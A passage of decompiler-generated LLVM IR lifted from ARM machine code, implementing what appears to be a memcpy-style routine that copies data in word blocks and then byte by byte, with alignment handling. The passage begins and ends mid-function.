  %v1_15bf0 = urem i32 %v0_15bd0, 4
  store i32 %v1_15bf0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15bf0 = icmp eq i32 %v1_15bf0, 0
  %extract.t = trunc i32 %v0_15bd0 to i2
  br i1 %v2_15bf0, label %dec_label_pc_15bf8, label %dec_label_pc_15cc4

dec_label_pc_15bf8:                               ; preds = %dec_label_pc_15bf0, %dec_label_pc_15cbc
  %v0_15c1093 = phi i32 [ %v1_15bd0, %dec_label_pc_15bf0 ], [ %v0_15d0c76, %dec_label_pc_15cbc ]
  %v0_15c0c92 = phi i32 [ %v0_15bd0, %dec_label_pc_15bf0 ], [ %v0_15cbc, %dec_label_pc_15cbc ]
  %v0_15bf8 = phi i32 [ %v2_15be0, %dec_label_pc_15bf0 ], [ %v2_15cb4, %dec_label_pc_15cbc ]
  %v2_15bf8 = add i32 %v0_15bf8, -8
  store i32 %v2_15bf8, i32* %r2.global-to-local, align 4
  %v4_15bf8 = sub i32 7, %v0_15bf8
  %v5_15bf8 = and i32 %v4_15bf8, %v0_15bf8
  %v6_15bf8 = icmp slt i32 %v5_15bf8, 0
  store i1 %v6_15bf8, i1* %cpsr_v.global-to-local, align 1
  %v7_15bf8 = icmp slt i32 %v2_15bf8, 0
  store i1 %v7_15bf8, i1* %cpsr_n.global-to-local, align 1
  %v5_15bfc = icmp slt i32 %v0_15bf8, 8
  br i1 %v5_15bfc, label %dec_label_pc_15c4c, label %dec_label_pc_15c00

dec_label_pc_15c00:                               ; preds = %dec_label_pc_15bf8
  %v2_15c00 = add i32 %v0_15bf8, -28
  store i32 %v2_15c00, i32* %r2.global-to-local, align 4
  %v4_15c00 = sub i32 27, %v0_15bf8
  %v5_15c00 = and i32 %v4_15c00, %v2_15bf8
  %v6_15c00 = icmp slt i32 %v5_15c00, 0
  store i1 %v6_15c00, i1* %cpsr_v.global-to-local, align 1
  %v7_15c00 = icmp slt i32 %v2_15c00, 0
  store i1 %v7_15c00, i1* %cpsr_n.global-to-local, align 1
  %v5_15c04 = icmp slt i32 %v2_15bf8, 20
  br i1 %v5_15c04, label %dec_label_pc_15c38, label %dec_label_pc_15c08

dec_label_pc_15c08:                               ; preds = %dec_label_pc_15c00
  %v0_15c08 = load i32, i32* @r4, align 4
  store i32 %v0_15c08, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15c0c:                               ; preds = %dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge, %dec_label_pc_15c08
  %v0_15c10 = phi i32 [ %v12_15c18, %dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge ], [ %v0_15c1093, %dec_label_pc_15c08 ]
  %v0_15c0c = phi i32 [ %v0_15c0c.pre, %dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge ], [ %v0_15c0c92, %dec_label_pc_15c08 ]
  %v1_15c0c = inttoptr i32 %v0_15c0c to i32*
  %v2_15c0c = load i32, i32* %v1_15c0c, align 4
  store i32 %v2_15c0c, i32* %r3.global-to-local, align 4
  %v3_15c0c = add i32 %v0_15c0c, 4
  %v4_15c0c = inttoptr i32 %v3_15c0c to i32*
  %v5_15c0c = load i32, i32* %v4_15c0c, align 4
  store i32 %v5_15c0c, i32* %r4.global-to-local, align 4
  %v6_15c0c = add i32 %v0_15c0c, 8
  %v7_15c0c = inttoptr i32 %v6_15c0c to i32*
  %v8_15c0c = load i32, i32* %v7_15c0c, align 4
  store i32 %v8_15c0c, i32* %ip.global-to-local, align 4
  %v9_15c0c = add i32 %v0_15c0c, 12
  %v10_15c0c = inttoptr i32 %v9_15c0c to i32*
  %v11_15c0c = load i32, i32* %v10_15c0c, align 4
  store i32 %v11_15c0c, i32* %lr.global-to-local, align 4
  %v12_15c0c = add i32 %v0_15c0c, 16
  store i32 %v12_15c0c, i32* %r1.global-to-local, align 4
  %v1_15c10 = inttoptr i32 %v0_15c10 to i32*
  store i32 %v2_15c0c, i32* %v1_15c10, align 4
  %v3_15c10 = add i32 %v0_15c10, 4
  %v4_15c10 = inttoptr i32 %v3_15c10 to i32*
  %v5_15c10 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15c10, i32* %v4_15c10, align 4
  %v6_15c10 = add i32 %v0_15c10, 8
  %v7_15c10 = inttoptr i32 %v6_15c10 to i32*
  %v8_15c10 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_15c10, i32* %v7_15c10, align 4
  %v9_15c10 = add i32 %v0_15c10, 12
  %v10_15c10 = inttoptr i32 %v9_15c10 to i32*
  %v11_15c10 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_15c10, i32* %v10_15c10, align 4
  %v12_15c10 = add i32 %v0_15c10, 16
  store i32 %v12_15c10, i32* %r0.global-to-local, align 4
  %v0_15c14 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c14 = inttoptr i32 %v0_15c14 to i32*
  %v2_15c14 = load i32, i32* %v1_15c14, align 4
  store i32 %v2_15c14, i32* %r3.global-to-local, align 4
  %v3_15c14 = add i32 %v0_15c14, 4
  %v4_15c14 = inttoptr i32 %v3_15c14 to i32*
  %v5_15c14 = load i32, i32* %v4_15c14, align 4
  store i32 %v5_15c14, i32* %r4.global-to-local, align 4
  %v6_15c14 = add i32 %v0_15c14, 8
  %v7_15c14 = inttoptr i32 %v6_15c14 to i32*
  %v8_15c14 = load i32, i32* %v7_15c14, align 4
  store i32 %v8_15c14, i32* %ip.global-to-local, align 4
  %v9_15c14 = add i32 %v0_15c14, 12
  %v10_15c14 = inttoptr i32 %v9_15c14 to i32*
  %v11_15c14 = load i32, i32* %v10_15c14, align 4
  store i32 %v11_15c14, i32* @lr, align 4
  %v12_15c14 = add i32 %v0_15c14, 16
  store i32 %v12_15c14, i32* %r1.global-to-local, align 4
  %v1_15c18 = inttoptr i32 %v12_15c10 to i32*
  store i32 %v2_15c14, i32* %v1_15c18, align 4
  %v3_15c18 = add i32 %v0_15c10, 20
  %v4_15c18 = inttoptr i32 %v3_15c18 to i32*
  %v5_15c18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15c18, i32* %v4_15c18, align 4
  %v6_15c18 = add i32 %v0_15c10, 24
  %v7_15c18 = inttoptr i32 %v6_15c18 to i32*
  %v8_15c18 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_15c18, i32* %v7_15c18, align 4
  %v9_15c18 = add i32 %v0_15c10, 28
  %v10_15c18 = inttoptr i32 %v9_15c18 to i32*
  %v11_15c18 = load i32, i32* @lr, align 4
  store i32 %v11_15c18, i32* %v10_15c18, align 4
  %v12_15c18 = add i32 %v0_15c10, 32
  store i32 %v12_15c18, i32* %r0.global-to-local, align 4
  %v0_15c1c = load i32, i32* %r2.global-to-local, align 4
  %v2_15c1c = add i32 %v0_15c1c, -32
  store i32 %v2_15c1c, i32* %r2.global-to-local, align 4
  %v6_15c20 = icmp slt i32 %v0_15c1c, 32
  br i1 %v6_15c20, label %dec_label_pc_15c24, label %dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge

dec_label_pc_15c0c.dec_label_pc_15c0c_crit_edge:  ; preds = %dec_label_pc_15c0c
  %v0_15c0c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15c0c

dec_label_pc_15c24:                               ; preds = %dec_label_pc_15c0c
  %v4_15c24 = add i32 %v0_15c1c, -16
  %v6_15c24 = add i32 %v0_15c1c, 2147483616
  %v7_15c24 = and i32 %v4_15c24, %v6_15c24
  %v8_15c24 = icmp slt i32 %v7_15c24, 0
  store i1 %v8_15c24, i1* %cpsr_v.global-to-local, align 1
  %v9_15c24 = icmp slt i32 %v4_15c24, 0
  store i1 %v9_15c24, i1* %cpsr_n.global-to-local, align 1
  %v5_15c28 = icmp slt i32 %v2_15c1c, -16
  br i1 %v5_15c28, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_15c24
  %v6_15c28 = load i32, i32* %r1.global-to-local, align 4
  %v7_15c28 = inttoptr i32 %v6_15c28 to i32*
  %v8_15c28 = load i32, i32* %v7_15c28, align 4
  store i32 %v8_15c28, i32* %r3.global-to-local, align 4
  %v9_15c28 = add i32 %v6_15c28, 4
  %v10_15c28 = inttoptr i32 %v9_15c28 to i32*
  %v11_15c28 = load i32, i32* %v10_15c28, align 4
  store i32 %v11_15c28, i32* %r4.global-to-local, align 4
  %v12_15c28 = add i32 %v6_15c28, 8
  %v13_15c28 = inttoptr i32 %v12_15c28 to i32*
  %v14_15c28 = load i32, i32* %v13_15c28, align 4
  store i32 %v14_15c28, i32* %ip.global-to-local, align 4
  %v15_15c28 = add i32 %v6_15c28, 12
  %v16_15c28 = inttoptr i32 %v15_15c28 to i32*
  %v17_15c28 = load i32, i32* %v16_15c28, align 4
  store i32 %v17_15c28, i32* @lr, align 4
  %v18_15c28 = add i32 %v6_15c28, 16
  store i32 %v18_15c28, i32* %r1.global-to-local, align 4
  %v7_15c2c = inttoptr i32 %v12_15c18 to i32*
  store i32 %v8_15c28, i32* %v7_15c2c, align 4
  %v9_15c2c = add i32 %v0_15c10, 36
  %v10_15c2c = inttoptr i32 %v9_15c2c to i32*
  %v11_15c2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_15c2c, i32* %v10_15c2c, align 4
  %v12_15c2c = add i32 %v0_15c10, 40
  %v13_15c2c = inttoptr i32 %v12_15c2c to i32*
  %v14_15c2c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v14_15c2c, i32* %v13_15c2c, align 4
  %v15_15c2c = add i32 %v0_15c10, 44
  %v16_15c2c = inttoptr i32 %v15_15c2c to i32*
  %v17_15c2c = load i32, i32* @lr, align 4
  store i32 %v17_15c2c, i32* %v16_15c2c, align 4
  %v18_15c2c = add i32 %v0_15c10, 48
  store i32 %v18_15c2c, i32* %r0.global-to-local, align 4
  %v6_15c30 = load i32, i32* %r2.global-to-local, align 4
  %v7_15c30 = add i32 %v6_15c30, -16
  store i32 %v7_15c30, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15c24, %bb130
  %v3_15c40102 = phi i32 [ %v12_15c18, %dec_label_pc_15c24 ], [ %v18_15c2c, %bb130 ]
  %v0_15c3896 = phi i32 [ %v2_15c1c, %dec_label_pc_15c24 ], [ %v7_15c30, %bb130 ]
  %v2_15c34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15c34, i32* @r4, align 4
  br label %dec_label_pc_15c38

dec_label_pc_15c38:                               ; preds = %dec_label_pc_15c00, %.thread2
  %v3_15c40101 = phi i32 [ %v0_15c1093, %dec_label_pc_15c00 ], [ %v3_15c40102, %.thread2 ]
  %v0_15c38 = phi i32 [ %v2_15c00, %dec_label_pc_15c00 ], [ %v0_15c3896, %.thread2 ]
  %v1_15c38 = add i32 %v0_15c38, 20
  store i32 %v1_15c38, i32* %r2.global-to-local, align 4
  %v3_15c38 = sub i32 0, %v0_15c38
  %v4_15c38 = and i32 %v1_15c38, %v3_15c38
  %v5_15c38 = icmp slt i32 %v4_15c38, 0
  store i1 %v5_15c38, i1* %cpsr_v.global-to-local, align 1
  %v6_15c38 = icmp slt i32 %v1_15c38, 0
  store i1 %v6_15c38, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %.thread118, %dec_label_pc_15c38
  %v0_15c4c.pre149 = phi i32 [ %v0_15c4c.pre, %.thread118 ], [ %v1_15c38, %dec_label_pc_15c38 ]
  %v3_15c40 = phi i32 [ %v3_15c4099119, %.thread118 ], [ %v3_15c40101, %dec_label_pc_15c38 ]
  %v1_15c44 = phi i1 [ %v1_15c48, %.thread118 ], [ %v5_15c38, %dec_label_pc_15c38 ]
  %v0_15c44 = phi i1 [ %v0_15c48, %.thread118 ], [ %v6_15c38, %dec_label_pc_15c38 ]
  %v2_15c3c = xor i1 %v1_15c44, %v0_15c44
  br i1 %v2_15c3c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_15c3c
  %v3_15c3c = load i32, i32* %r1.global-to-local, align 4
  %v4_15c3c = inttoptr i32 %v3_15c3c to i32*
  %v5_15c3c = load i32, i32* %v4_15c3c, align 4
  store i32 %v5_15c3c, i32* %r3.global-to-local, align 4
  %v6_15c3c = add i32 %v3_15c3c, 4
  %v7_15c3c = inttoptr i32 %v6_15c3c to i32*
  %v8_15c3c = load i32, i32* %v7_15c3c, align 4
  store i32 %v8_15c3c, i32* %ip.global-to-local, align 4
  %v9_15c3c = add i32 %v3_15c3c, 8
  %v10_15c3c = inttoptr i32 %v9_15c3c to i32*
  %v11_15c3c = load i32, i32* %v10_15c3c, align 4
  store i32 %v11_15c3c, i32* @lr, align 4
  %v12_15c3c = add i32 %v3_15c3c, 12
  store i32 %v12_15c3c, i32* %r1.global-to-local, align 4
  %v4_15c40 = inttoptr i32 %v3_15c40 to i32*
  store i32 %v5_15c3c, i32* %v4_15c40, align 4
  %v6_15c40 = add i32 %v3_15c40, 4
  %v7_15c40 = inttoptr i32 %v6_15c40 to i32*
  %v8_15c40 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_15c40, i32* %v7_15c40, align 4
  %v9_15c40 = add i32 %v3_15c40, 8
  %v10_15c40 = inttoptr i32 %v9_15c40 to i32*
  %v11_15c40 = load i32, i32* @lr, align 4
  store i32 %v11_15c40, i32* %v10_15c40, align 4
  %v12_15c40 = add i32 %v3_15c40, 12
  store i32 %v12_15c40, i32* %r0.global-to-local, align 4
  %v3_15c44 = load i32, i32* %r2.global-to-local, align 4
  %v4_15c44 = add i32 %v3_15c44, -12
  store i32 %v4_15c44, i32* %r2.global-to-local, align 4
  %v6_15c44 = sub i32 11, %v3_15c44
  %v7_15c44 = and i32 %v6_15c44, %v3_15c44
  %v8_15c44 = icmp slt i32 %v7_15c44, 0
  store i1 %v8_15c44, i1* %cpsr_v.global-to-local, align 1
  %v9_15c44 = icmp slt i32 %v4_15c44, 0
  store i1 %v9_15c44, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_15c3c, %bb131
  %v0_15c4c.pre = phi i32 [ %v4_15c44, %bb131 ], [ %v0_15c4c.pre149, %dec_label_pc_15c3c ]
  %v3_15c4099119 = phi i32 [ %v12_15c40, %bb131 ], [ %v3_15c40, %dec_label_pc_15c3c ]
  %v1_15c48 = phi i1 [ %v8_15c44, %bb131 ], [ %v1_15c44, %dec_label_pc_15c3c ]
  %v0_15c48 = phi i1 [ %v9_15c44, %bb131 ], [ %v0_15c44, %dec_label_pc_15c3c ]
  %v2_15c48 = xor i1 %v1_15c48, %v0_15c48
  br i1 %v2_15c48, label %dec_label_pc_15c4c, label %dec_label_pc_15c3c

dec_label_pc_15c4c:                               ; preds = %.thread118, %dec_label_pc_15bf8
  %v7_15c5c = phi i32 [ %v0_15c1093, %dec_label_pc_15bf8 ], [ %v3_15c4099119, %.thread118 ]
  %v0_15c4c = phi i32 [ %v2_15bf8, %dec_label_pc_15bf8 ], [ %v0_15c4c.pre, %.thread118 ]
  %v2_15c4c = add i32 %v0_15c4c, 8
  store i32 %v2_15c4c, i32* %r2.global-to-local, align 4
  %v4_15c4c = sub i32 0, %v0_15c4c
  %v5_15c4c = and i32 %v2_15c4c, %v4_15c4c
  %v6_15c4c = icmp slt i32 %v5_15c4c, 0
  store i1 %v6_15c4c, i1* %cpsr_v.global-to-local, align 1
  %v7_15c4c = icmp slt i32 %v2_15c4c, 0
  store i1 %v7_15c4c, i1* %cpsr_n.global-to-local, align 1
  %v5_15c50 = icmp slt i32 %v0_15c4c, -8
  br i1 %v5_15c50, label %bb133, label %dec_label_pc_15c54

dec_label_pc_15c54:                               ; preds = %dec_label_pc_15c4c
  %v6_15c54 = add i32 %v0_15c4c, 4
  store i32 %v6_15c54, i32* %r2.global-to-local, align 4
  %v8_15c54 = sub i32 -5, %v0_15c4c
  %v9_15c54 = and i32 %v8_15c54, %v2_15c4c
  %v10_15c54 = icmp slt i32 %v9_15c54, 0
  store i1 %v10_15c54, i1* %cpsr_v.global-to-local, align 1
  %v11_15c54 = icmp slt i32 %v6_15c54, 0
  store i1 %v11_15c54, i1* %cpsr_n.global-to-local, align 1
  %v5_15c58 = icmp slt i32 %v2_15c4c, 4
  %v6_15c58 = load i32, i32* %r1.global-to-local, align 4
  %v7_15c58 = inttoptr i32 %v6_15c58 to i32*
  %v8_15c58 = load i32, i32* %v7_15c58, align 4
  store i32 %v8_15c58, i32* %r3.global-to-local, align 4
  %v10_15c58 = add i32 %v6_15c58, 4
  br i1 %v5_15c58, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_15c54
  store i32 %v10_15c58, i32* %r1.global-to-local, align 4
  %v8_15c5c = inttoptr i32 %v7_15c5c to i32*
  store i32 %v8_15c58, i32* %v8_15c5c, align 4
  %v9_15c5c = load i32, i32* %r0.global-to-local, align 4
  %v10_15c5c = add i32 %v9_15c5c, 4
  store i32 %v10_15c5c, i32* %r0.global-to-local, align 4
  %v0_15c6c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_15c54
  %v10_15c60 = inttoptr i32 %v10_15c58 to i32*
  %v11_15c60 = load i32, i32* %v10_15c60, align 4
  store i32 %v11_15c60, i32* %ip.global-to-local, align 4
  %v12_15c60 = add i32 %v6_15c58, 8
  store i32 %v12_15c60, i32* %r1.global-to-local, align 4
  %v7_15c64 = inttoptr i32 %v7_15c5c to i32*
  store i32 %v8_15c58, i32* %v7_15c64, align 4
  %v9_15c64 = add i32 %v7_15c5c, 4
  %v10_15c64 = inttoptr i32 %v9_15c64 to i32*
  %v11_15c64 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15c64, i32* %v10_15c64, align 4
  %v12_15c64 = add i32 %v7_15c5c, 8
  store i32 %v12_15c64, i32* %r0.global-to-local, align 4
  %v6_15c68 = load i32, i32* %r2.global-to-local, align 4
  %v7_15c68 = add i32 %v6_15c68, -4
  store i32 %v7_15c68, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_15c4c, %bb, %dec_label_pc_15d3c, %dec_label_pc_15e14, %dec_label_pc_15da8, %bb132
  %v2_15c7c = phi i32 [ %v10_15c5c, %.thread6 ], [ %v0_15d0c76, %.thread12 ], [ %v7_15c5c, %dec_label_pc_15c4c ], [ %v1_15bd0, %bb ], [ %v2_15c7c114, %dec_label_pc_15d3c ], [ %v2_15c7c113, %dec_label_pc_15e14 ], [ %v2_15c7c112, %dec_label_pc_15da8 ], [ %v12_15c64, %bb132 ]
  %v0_15c6c = phi i32 [ %v0_15c6c.pre, %.thread6 ], [ %v2_15cb4, %.thread12 ], [ %v2_15c4c, %dec_label_pc_15c4c ], [ %v2_15be0, %bb ], [ %v0_15c6c110, %dec_label_pc_15d3c ], [ %v0_15c6c109, %dec_label_pc_15e14 ], [ %v0_15c6c108, %dec_label_pc_15da8 ], [ %v7_15c68, %bb132 ]
  %v1_15c6c = add i32 %v0_15c6c, 4
  store i32 %v1_15c6c, i32* @r2, align 4
  %v3_15c6c = sub i32 0, %v0_15c6c
  %v4_15c6c = and i32 %v1_15c6c, %v3_15c6c
  %v5_15c6c = icmp slt i32 %v4_15c6c, 0
  store i1 %v5_15c6c, i1* %cpsr_v.global-to-local, align 1
  %v6_15c6c = icmp slt i32 %v1_15c6c, 0
  store i1 %v6_15c6c, i1* %cpsr_n.global-to-local, align 1
  %v7_15c6c = icmp eq i32 %v1_15c6c, 0
  store i1 %v7_15c6c, i1* @cpsr_z, align 1
  br i1 %v7_15c6c, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_15c70 = load i8*, i8** %stack_var_-8, align 4
  %v4_15c70 = ptrtoint i8* %v3_15c70 to i32
  store i32 %v4_15c70, i32* %r0.global-to-local, align 4
  ret i32 %v4_15c70

bb135:                                            ; preds = %bb133
  %v1_15c74 = add i32 %v0_15c6c, 2
  %v3_15c74 = sub i32 -3, %v0_15c6c
  %v4_15c74 = and i32 %v3_15c74, %v1_15c6c
  %v5_15c74 = icmp slt i32 %v4_15c74, 0
  store i1 %v5_15c74, i1* %cpsr_v.global-to-local, align 1
  %v6_15c74 = icmp slt i32 %v1_15c74, 0
  store i1 %v6_15c74, i1* %cpsr_n.global-to-local, align 1
  %v7_15c74 = icmp eq i32 %v1_15c6c, 2
  store i1 %v7_15c74, i1* @cpsr_z, align 1
  %v0_15c78 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c78 = inttoptr i32 %v0_15c78 to i8*
  %v2_15c78 = load i8, i8* %v1_15c78, align 1
  %v3_15c78 = zext i8 %v2_15c78 to i32
  store i32 %v3_15c78, i32* %r3.global-to-local, align 4
  %v5_15c78 = add i32 %v0_15c78, 1
  store i32 %v5_15c78, i32* %r1.global-to-local, align 4
  %v3_15c7c = inttoptr i32 %v2_15c7c to i8*
  store i8 %v2_15c78, i8* %v3_15c7c, align 1
  %v4_15c7c = load i32, i32* %r0.global-to-local, align 4
  %v5_15c7c = add i32 %v4_15c7c, 1
  store i32 %v5_15c7c, i32* %r0.global-to-local, align 4
  %v0_15c80 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15c80 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15c80 = xor i1 %v0_15c80, %v1_15c80
  br i1 %v2_15c80, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_15c80 = load i32, i32* %r1.global-to-local, align 4
  %v4_15c80 = inttoptr i32 %v3_15c80 to i8*
  %v5_15c80 = load i8, i8* %v4_15c80, align 1
  %v6_15c80 = zext i8 %v5_15c80 to i32
  store i32 %v6_15c80, i32* %r3.global-to-local, align 4
  %v8_15c80 = add i32 %v3_15c80, 1
  store i32 %v8_15c80, i32* %r1.global-to-local, align 4
  %v6_15c84 = inttoptr i32 %v5_15c7c to i8*
  store i8 %v5_15c80, i8* %v6_15c84, align 1
  %v7_15c84 = load i32, i32* %r0.global-to-local, align 4
  %v8_15c84 = add i32 %v7_15c84, 1
  store i32 %v8_15c84, i32* %r0.global-to-local, align 4
  %v1_15c88.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15c88.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_15c8c = phi i32 [ %v8_15c84, %bb136 ], [ %v5_15c7c, %bb135 ]
  %v2_15c8c = phi i1 [ %v2_15c88.pre, %bb136 ], [ %v1_15c80, %bb135 ]
  %v1_15c8c = phi i1 [ %v1_15c88.pre, %bb136 ], [ %v0_15c80, %bb135 ]
  %v0_15c88 = load i1, i1* @cpsr_z, align 1
  %v3_15c88 = xor i1 %v2_15c8c, %v1_15c8c
  %v4_15c88 = or i1 %v0_15c88, %v3_15c88
  br i1 %v4_15c88, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_15c88 = load i32, i32* %r1.global-to-local, align 4
  %v6_15c88 = inttoptr i32 %v5_15c88 to i8*
  %v7_15c88 = load i8, i8* %v6_15c88, align 1
  %v8_15c88 = zext i8 %v7_15c88 to i32
  store i32 %v8_15c88, i32* %r3.global-to-local, align 4
  %v10_15c88 = add i32 %v5_15c88, 1
  store i32 %v10_15c88, i32* %r1.global-to-local, align 4
  %v8_15c8c = inttoptr i32 %v7_15c8c to i8*
  store i8 %v7_15c88, i8* %v8_15c8c, align 1
  %v9_15c8c = load i32, i32* %r0.global-to-local, align 4
  %v10_15c8c = add i32 %v9_15c8c, 1
  store i32 %v10_15c8c, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_15c90 = load i8*, i8** %stack_var_-8, align 4
  %v3_15c90 = ptrtoint i8* %v2_15c90 to i32
  store i32 %v3_15c90, i32* %r0.global-to-local, align 4
  ret i32 %v3_15c90

dec_label_pc_15c94:                               ; preds = %dec_label_pc_15be8
  %v1_15c94 = sub nsw i32 4, %v1_15be8
  store i32 %v1_15c94, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15c98 = icmp ult i32 %v1_15c94, 2
  store i1 %v8_15c98, i1* %cpsr_n.global-to-local, align 1
  %v1_15c9c = inttoptr i32 %v0_15bd0 to i8*
  %v2_15c9c = load i8, i8* %v1_15c9c, align 1
  %v3_15c9c = zext i8 %v2_15c9c to i32
  store i32 %v3_15c9c, i32* %r3.global-to-local, align 4
  %v5_15c9c = add i32 %v0_15bd0, 1
  store i32 %v5_15c9c, i32* %r1.global-to-local, align 4
  store i8 %v2_15c9c, i8* %v5_15bdc, align 1
  %v4_15ca0 = load i32, i32* %r0.global-to-local, align 4
  %v5_15ca0 = add i32 %v4_15ca0, 1
  store i32 %v5_15ca0, i32* %r0.global-to-local, align 4
  br i1 %v8_15c98, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_15c94
  %v9_15c98 = icmp eq i32 %v1_15c94, 2
  %v6_15ca4 = load i32, i32* %r1.global-to-local, align 4
  %v7_15ca4 = inttoptr i32 %v6_15ca4 to i8*
  %v8_15ca4 = load i8, i8* %v7_15ca4, align 1
  %v9_15ca4 = zext i8 %v8_15ca4 to i32
  store i32 %v9_15ca4, i32* %r3.global-to-local, align 4
  %v11_15ca4 = add i32 %v6_15ca4, 1
  store i32 %v11_15ca4, i32* %r1.global-to-local, align 4
  %v9_15ca8 = inttoptr i32 %v5_15ca0 to i8*
  store i8 %v8_15ca4, i8* %v9_15ca8, align 1
  %v10_15ca8 = load i32, i32* %r0.global-to-local, align 4
  %v11_15ca8 = add i32 %v10_15ca8, 1
  store i32 %v11_15ca8, i32* %r0.global-to-local, align 4
  br i1 %v9_15c98, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_15cac = load i32, i32* %r1.global-to-local, align 4
  %v9_15cac = inttoptr i32 %v8_15cac to i8*
  %v10_15cac = load i8, i8* %v9_15cac, align 1
  %v11_15cac = zext i8 %v10_15cac to i32
  store i32 %v11_15cac, i32* %r3.global-to-local, align 4
  %v13_15cac = add i32 %v8_15cac, 1
  store i32 %v13_15cac, i32* %r1.global-to-local, align 4
  %v11_15cb0 = inttoptr i32 %v11_15ca8 to i8*
  store i8 %v10_15cac, i8* %v11_15cb0, align 1
  %v12_15cb0 = load i32, i32* %r0.global-to-local, align 4
  %v13_15cb0 = add i32 %v12_15cb0, 1
  store i32 %v13_15cb0, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_15c94, %bb139
  %v0_15d0c76 = phi i32 [ %v11_15ca8, %bb138 ], [ %v5_15ca0, %dec_label_pc_15c94 ], [ %v13_15cb0, %bb139 ]
  %v0_15cb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15cb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_15cb4 = sub i32 %v0_15cb4, %v1_15cb4
  store i32 %v2_15cb4, i32* %r2.global-to-local, align 4
  %v4_15cb4 = xor i32 %v1_15cb4, %v0_15cb4
  %v5_15cb4 = xor i32 %v2_15cb4, %v0_15cb4
  %v6_15cb4 = and i32 %v5_15cb4, %v4_15cb4
  %v7_15cb4 = icmp slt i32 %v6_15cb4, 0
  store i1 %v7_15cb4, i1* %cpsr_v.global-to-local, align 1
  %v8_15cb4 = icmp slt i32 %v2_15cb4, 0
  store i1 %v8_15cb4, i1* %cpsr_n.global-to-local, align 1
  %v5_15cb8 = icmp slt i32 %v0_15cb4, %v1_15cb4
  br i1 %v5_15cb8, label %bb133, label %dec_label_pc_15cbc

dec_label_pc_15cbc:                               ; preds = %.thread12
  %v0_15cbc = load i32, i32* %r1.global-to-local, align 4
  %v1_15cbc = urem i32 %v0_15cbc, 4
  store i32 %v1_15cbc, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15cbc = icmp eq i32 %v1_15cbc, 0
  %extract.t124 = trunc i32 %v0_15cbc to i2
  br i1 %v2_15cbc, label %dec_label_pc_15bf8, label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %dec_label_pc_15bf0, %dec_label_pc_15cbc
  %v0_15d0c75 = phi i32 [ %v1_15bd0, %dec_label_pc_15bf0 ], [ %v0_15d0c76, %dec_label_pc_15cbc ]
  %v0_15db8 = phi i32 [ %v2_15be0, %dec_label_pc_15bf0 ], [ %v2_15cb4, %dec_label_pc_15cbc ]
  %v0_15ccc.off0 = phi i2 [ %extract.t, %dec_label_pc_15bf0 ], [ %extract.t124, %dec_label_pc_15cbc ]
  %v0_15cc4 = phi i32 [ %v0_15bd0, %dec_label_pc_15bf0 ], [ %v0_15cbc, %dec_label_pc_15cbc ]
  %v1_15cc4 = and i32 %v0_15cc4, -4
  store i32 %v1_15cc4, i32* %r1.global-to-local, align 4
  %v1_15cc8 = inttoptr i32 %v1_15cc4 to i32*
  %v2_15cc8 = load i32, i32* %v1_15cc8, align 4
  store i32 %v2_15cc8, i32* @lr, align 4
  %v4_15cc8 = add i32 %v1_15cc4, 4
  store i32 %v4_15cc8, i32* %r1.global-to-local, align 4
  %v2_15db0 = add i32 %v0_15db8, -12
  %v4_15db0 = sub i32 11, %v0_15db8
  %v5_15db0 = and i32 %v4_15db0, %v0_15db8
  %v6_15db0 = icmp slt i32 %v5_15db0, 0
  store i1 %v6_15db0, i1* %cpsr_v.global-to-local, align 1
  %v7_15db0 = icmp slt i32 %v2_15db0, 0
  store i1 %v7_15db0, i1* %cpsr_n.global-to-local, align 1
  %v5_15db4 = icmp slt i32 %v0_15db8, 12
  switch i2 %v0_15ccc.off0, label %dec_label_pc_15cd8 [
